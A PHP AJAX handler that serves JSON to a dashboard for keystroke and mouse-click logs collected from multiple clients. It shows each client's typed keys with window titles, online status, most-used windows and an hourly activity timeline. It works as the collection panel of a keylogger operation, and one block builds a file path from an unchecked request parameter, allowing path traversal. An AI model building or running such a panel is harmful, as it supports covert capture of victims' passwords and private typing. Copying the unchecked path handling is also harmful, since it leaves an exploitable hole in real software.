<?php
/**
 * AJAX Handler for reactive dashboard updates
 * Returns JSON data for the dashboard
 */

header('Content-Type: application/json');

// Configuration
$baseDir = __DIR__ . '/logs';

// Get parameters
$clientId = isset($_GET['client']) ? $_GET['client'] : null;
if ($clientId) {
    $clientId = urldecode($clientId);
}

// Get all clients
$clients = [];
$totalSize = 0;
$totalEvents = 0;
$activeToday = 0;
$today = date('Y-m-d');

if (is_dir($baseDir)) {
    $dirs = scandir($baseDir);
    foreach ($dirs as $dir) {
        if ($dir != '.' && $dir != '..' && is_dir($baseDir . '/' . $dir)) {
            $logPath = $baseDir . '/' . $dir . '/log.txt';
            $lastActivity = file_exists($logPath) ? date('Y-m-d H:i:s', filemtime($logPath)) : 'Never';
            $logSize = file_exists($logPath) ? filesize($logPath) : 0;
            $totalSize += $logSize;
            
            // Get first and last timestamp from logs
            $firstSeen = 'Unknown';
            $lastSeen = 'Unknown';
            $clientEventCount = 0;
            
            if (file_exists($logPath) && $logSize > 0) {
                $lines = file($logPath);
                $clientEventCount = count($lines);
                $totalEvents += $clientEventCount;
                
                if (!empty($lines)) {
                    // Find first timestamp
                    foreach ($lines as $line) {
                        if (preg_match('/\[(KEY|MOUSE)\] (\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})/', $line, $matches)) {
                            $firstSeen = $matches[2];
                            break;
                        }
                    }
                    // Find last timestamp
                    for ($i = count($lines) - 1; $i >= 0; $i--) {
                        if (preg_match('/\[(KEY|MOUSE)\] (\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})/', $lines[$i], $matches)) {
                            $lastSeen = $matches[2];
                            break;
                        }
                    }
                }
            }
            
            // Check if online (active in last 5 minutes)
            $timeDiff = time() - strtotime($lastActivity);
            $isOnline = $timeDiff < 300;
            
            // Check if active today
            if (substr($lastActivity, 0, 10) == $today) {
                $activeToday++;
            }
            
            // Format log size
            if ($logSize > 1048576) {
                $logSizeFormatted = round($logSize / 1048576, 2) . ' MB';
            } elseif ($logSize > 1024) {
                $logSizeFormatted = round($logSize / 1024, 2) . ' KB';
            } else {
                $logSizeFormatted = $logSize . ' B';
            }
            
            $clients[] = [
                'id' => $dir,
                'displayName' => substr($dir, 0, 40) . (strlen($dir) > 40 ? '...' : ''),
                'last_activity' => $lastActivity,
                'log_size' => $logSize,
                'logSizeFormatted' => $logSizeFormatted,
                'firstSeen' => substr($firstSeen, 0, 16),
                'lastSeen' => substr($lastSeen, 0, 16),
                'isOnline' => $isOnline,
                'eventCount' => $clientEventCount
            ];
        }
    }
    
    // Sort by last activity
    usort($clients, function($a, $b) {
        return strtotime($b['last_activity']) - strtotime($a['last_activity']);
    });
}

// Format total size
if ($totalSize > 1048576) {
    $totalSizeFormatted = round($totalSize / 1048576, 2) . ' MB';
} elseif ($totalSize > 1024) {
    $totalSizeFormatted = round($totalSize / 1024, 2) . ' KB';
} else {
    $totalSizeFormatted = $totalSize . ' bytes';
}

// Get client logs if requested
$clientLogs = '';
$windowStats = ['total' => 0, 'items' => []];
$keyCount = 0;
$mouseCount = 0;

if ($clientId && !empty($clients)) {
    $found = false;
    foreach ($clients as $client) {
        if ($client['id'] == $clientId) {
            $found = true;
            break;
        }
    }
    
    if ($found) {
        $logFilePath = $baseDir . '/' . $clientId . '/log.txt';
        
        if (file_exists($logFilePath)) {
            $rawLogs = file_get_contents($logFilePath);
            
            // Count events
            $keyCount = substr_count($rawLogs, '[KEY]');
            $mouseCount = substr_count($rawLogs, '[MOUSE]');
            
            // Generate window statistics
            $windowCounts = [];
            $lines = explode("\n", $rawLogs);
            foreach ($lines as $line) {
                if (preg_match('/Window: ([^|]+) \|/', $line, $matches)) {
                    $window = trim($matches[1]);
                    if (!empty($window) && $window != 'Unknown' && $window != 'Error detecting window' && $window != 'Window detection not supported') {
                        if (!isset($windowCounts[$window])) {
                            $windowCounts[$window] = 0;
                        }
                        $windowCounts[$window]++;
                    }
                }
            }
            arsort($windowCounts);
            
            $totalWindowEvents = array_sum($windowCounts);
            foreach ($windowCounts as $window => $count) {
                $percentage = $totalWindowEvents > 0 ? round(($count / $totalWindowEvents) * 100, 1) : 0;
                $windowStats['items'][] = [
                    'name' => htmlspecialchars($window),
                    'count' => $count,
                    'percentage' => $percentage
                ];
            }
            $windowStats['total'] = $totalWindowEvents;
            
            // Format logs with colors for display
            $clientLogs = htmlspecialchars($rawLogs);
            $clientLogs = preg_replace('/\[KEY\] (.*?) \| Window: (.*?) \| Key: (.*?)\n/', 
                '<span class="log-entry-key">[KEY] $1</span> <span class="log-window">| Window: $2</span> | Key: $3' . "\n", 
                $clientLogs);
            $clientLogs = preg_replace('/\[MOUSE\] (.*?) \| Window: (.*?) \| Click at (.*?)\n/', 
                '<span class="log-entry-mouse">[MOUSE] $1</span> <span class="log-window">| Window: $2</span> | Click at $3' . "\n", 
                $clientLogs);
        }
    }
}

// Get hourly activity for timeline
$hourlyActivity = array_fill(0, 24, 0);
if ($clientId && file_exists($baseDir . '/' . $clientId . '/log.txt')) {
    $lines = file($baseDir . '/' . $clientId . '/log.txt');
    foreach ($lines as $line) {
        if (preg_match('/\] (\d{4}-\d{2}-\d{2}) (\d{2}):/', $line, $matches)) {
            $hour = intval($matches[2]);
            if ($hour >= 0 && $hour <= 23) {
                $hourlyActivity[$hour]++;
            }
        }
    }
}

// Return JSON response
echo json_encode([
    'timestamp' => date('Y-m-d H:i:s'),
    'stats' => [
        'totalClients' => count($clients),
        'totalSize' => $totalSizeFormatted,
        'activeToday' => $activeToday,
        'totalEvents' => number_format($totalEvents)
    ],
    'clients' => $clients,
    'clientLogs' => $clientLogs,
    'windowStats' => $windowStats,
    'keyCount' => $keyCount,
    'mouseCount' => $mouseCount,
    'hourlyActivity' => $hourlyActivity,
    'selectedClient' => $clientId
]);
?>
